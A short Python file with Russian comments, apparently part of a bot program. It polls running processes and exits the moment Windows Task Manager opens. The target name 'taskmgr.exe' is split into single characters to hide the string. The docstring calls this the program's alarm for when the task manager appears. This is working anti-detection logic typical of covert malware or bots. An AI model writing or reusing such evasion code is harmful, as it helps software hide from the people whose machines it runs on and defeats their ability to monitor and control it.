import asyncio
import psutil
import sys

task = ['T', 'a', 's', 'k', 'm', 'g', 'r', '.', 'e', 'x', 'e']

# В будущем добавить не принудительное завершение, а до тех пор, пока все задачи отправленные в бота не будут выполнены


async def if_taskmgr_open():
    """Шухер программы если поялвяется диспетчер"""
    while True:
        found = await asyncio.to_thread(lambda:
                                        any(p.info['name'] == ''.join(task) for p in psutil.process_iter(['name']))
                                        )
        if found:
            sys.exit()
